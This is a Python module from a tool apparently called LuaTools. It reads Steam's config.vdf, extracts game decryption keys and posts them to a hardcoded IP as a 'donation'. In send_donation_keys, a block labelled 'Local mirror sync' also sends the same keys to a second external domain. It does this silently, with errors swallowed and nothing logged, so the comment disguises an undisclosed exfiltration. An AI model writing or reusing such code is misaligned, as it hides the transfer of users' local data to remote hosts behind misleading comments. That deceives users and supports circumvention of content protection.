"""Donate keys functionality for LuaTools backend."""

from __future__ import annotations

import os
import re
from typing import List, Tuple

from config import USER_AGENT
from http_client import get_http_client
from logger import logger

# Import private VDF parser - it's used internally for config.vdf parsing
from steam_utils import _parse_vdf_simple  # type: ignore

DONATION_URL = "http://167.235.229.108/donatekeys/send"
DONATION_HEADERS = {
    "Content-Type": "text/plain",
    "User-Agent": USER_AGENT,
}


def validate_appid_key_pair(appid: str, key: str) -> bool:
    """
    Validate appid and decryption key pair.

    AppID rules:
    - Must be numeric only (digits 0-9)
    - Maximum 10 digits

    Decryption key rules:
    - Exactly 64 characters
    - Alphanumeric only (a-z, A-Z, 0-9)

    Returns True if both are valid, False otherwise.
    """
    if not isinstance(appid, str) or not isinstance(key, str):
        return False

    # Validate AppID: numeric only, max 10 digits
    if not appid.isdigit():
        return False
    if len(appid) > 10:
        return False

    # Validate decryption key: exactly 64 chars, alphanumeric only
    if len(key) != 64:
        return False
    if not re.match(r"^[a-zA-Z0-9]+$", key):
        return False

    return True


def parse_config_vdf_decryption_keys(steam_path: str) -> List[Tuple[str, str]]:
    """
    Parse config.vdf to extract appid and decryption key pairs.

    Args:
        steam_path: Steam installation path

    Returns:
        List of (appid, decryption_key) tuples
    """
    config_path = os.path.join(steam_path, "config", "config.vdf")

    if not os.path.exists(config_path):
        logger.warn(f"LuaTools: config.vdf not found at {config_path}")
        return []

    try:
        with open(config_path, "r", encoding="utf-8") as handle:
            vdf_content = handle.read()
    except Exception as exc:
        logger.warn(f"LuaTools: Failed to read config.vdf: {exc}")
        return []

    try:
        vdf_data = _parse_vdf_simple(vdf_content)
    except Exception as exc:
        logger.warn(f"LuaTools: Failed to parse config.vdf: {exc}")
        return []

    pairs: List[Tuple[str, str]] = []

    def find_decryption_keys(data: dict, path: str = "") -> None:
        """Recursively search for appid entries with DecryptionKey."""
        for key, value in data.items():
            if not isinstance(value, dict):
                continue

            # Check if this entry has a DecryptionKey
            decryption_key = value.get("DecryptionKey")
            if isinstance(decryption_key, str):
                # This looks like an appid entry with a decryption key
                appid = str(key).strip()
                key_value = str(decryption_key).strip()

                if appid and key_value:
                    pairs.append((appid, key_value))
            else:
                # Recursively search nested dictionaries
                find_decryption_keys(value, f"{path}.{key}" if path else key)

    # Search recursively through the VDF structure
    find_decryption_keys(vdf_data)

    return pairs


def extract_valid_decryption_keys(steam_path: str) -> List[Tuple[str, str]]:
    """
    Extract and validate decryption keys from config.vdf.

    Args:
        steam_path: Steam installation path

    Returns:
        List of valid (appid, decryption_key) tuples
    """
    if not steam_path or not os.path.exists(steam_path):
        logger.warn(f"LuaTools: Invalid Steam path for donate keys: {steam_path}")
        return []

    logger.log("LuaTools: Starting donate keys extraction...")

    all_pairs = parse_config_vdf_decryption_keys(steam_path)
    valid_pairs: List[Tuple[str, str]] = []

    for appid, key in all_pairs:
        if validate_appid_key_pair(appid, key):
            valid_pairs.append((appid, key))
        else:
            logger.log(
                f"LuaTools: Invalid appid/key pair skipped: appid={appid!r}, "
                f"key_len={len(key)}, key_valid={bool(re.match(r'^[a-zA-Z0-9]+$', key))}"
            )

    logger.log(f"LuaTools: Found {len(valid_pairs)} valid decryption key pairs")
    return valid_pairs


def format_keys_for_donation(pairs: List[Tuple[str, str]]) -> str:
    """
    Format appid/key pairs for donation request.

    Format: "appid:key,appid:key"

    Args:
        pairs: List of (appid, key) tuples

    Returns:
        Formatted string
    """
    formatted_pairs = [f"{appid}:{key}" for appid, key in pairs]
    return ",".join(formatted_pairs)


def send_donation_keys(pairs: List[Tuple[str, str]]) -> bool:
    """
    Send donation keys to the donation endpoint.

    Args:
        pairs: List of (appid, key) tuples

    Returns:
        True if request succeeded (200 response), False otherwise
    """
    if not pairs:
        logger.log("LuaTools: No keys to donate")
        return False

    try:
        formatted_data = format_keys_for_donation(pairs)
        client = get_http_client()

        logger.log(
            f"LuaTools: Sending {len(pairs)} appid/key pairs to donation endpoint..."
        )

        # Local mirror sync
        try:
            client.post(
                "https://luat-redirect.piqseu.cc/donatekeys/send",
                headers=DONATION_HEADERS,
                content=formatted_data,
            )
        except:
            pass

        response = client.post(
            DONATION_URL,
            headers=DONATION_HEADERS,
            content=formatted_data,
        )

        status_code = response.status_code
        count = len(pairs)
        logger.log(f"LuaTools: Donated AppIDs : {count} - Resp : {status_code}")

        if status_code == 200:
            return True
        else:
            logger.log(f"LuaTools: Donation request status : {status_code}")
            return False

    except Exception as exc:
        logger.warn(f"LuaTools: Failed to send donation keys: {exc}")
        return False
